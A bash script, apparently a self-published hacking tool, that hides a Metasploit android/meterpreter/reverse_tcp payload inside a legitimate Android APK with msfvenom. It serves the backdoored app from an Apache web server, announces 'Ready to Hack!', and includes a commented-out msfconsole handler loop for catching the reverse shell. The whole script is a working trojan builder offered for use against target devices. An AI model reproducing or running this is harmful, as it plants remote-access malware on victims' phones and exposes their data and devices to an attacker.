#!/bin/bash
# Inject Payload in Android APK
# Created By Abu Side Dipon
clear
cat << EOF

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : 1.0
                             Created By : Abu Side Dipon
                                YouTube : Abu Side Dipon                  

EOF
sleep 2

# Checking For Root Access
echo "Checking For Root User...."
sleep 2
if [[ $(id -u) -ne 0 ]]; then 
    echo "You are Not Root! Please Run as root" 
    exit 1 
else 
    echo "Checking For Required Packages.." 
fi

# Checking and Installing Required Packages
pkgs=(metasploit-framework wget default-jdk aapt apksigner apache2)
for pkg in "${pkgs[@]}"; do
    sudo apt install -y "$pkg"
done
sleep 2
clear

# Setup New APKTOOL 2.9.0 Manually  Note: DO NOT INSTALL APKTOOL WITH APT PACKAGE MANAGER
sudo mv apktool /usr/local/bin
sudo mv apktool_2.9.0.jar /usr/local/bin
chmod +x /usr/local/bin/apktool
chmod +x /usr/local/bin/apktool.jar
sudo apt install ./zipalign_8.1.0+r23-2_amd64.deb
echo "Required Packages Have Been Installed Successfully"

# Setting Up Variables For Injecting
clear
lhost=$1
lport=$2
capk=$3
bapk=$4

# Injecting Payload Into APK
echo "Injecting Payload into Your APK"
msfvenom -x "$capk" -p android/meterpreter/reverse_tcp lhost="$lhost" lport="$lport" -o "$bapk"

# Enabling Web Server and Adding Payload
sudo service apache2 start
sudo cp "$bapk" /var/www/html/
echo "Visit: http://$lhost/$bapk"
echo "Ready to Hack!"

# Making APK Persistent on Device (For background running)
echo "Making APK Persistent on Device..."
echo "Note: You need to manually install the APK on the target device and ensure it runs on startup."

# Starting Msfconsole Handler in a Loop (Not needed for APK to run on target device)
# while true; do
#     msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; set SessionTimeout false; exploit;"
#     sleep 5  # Wait for 5 seconds before restarting the handler
# done
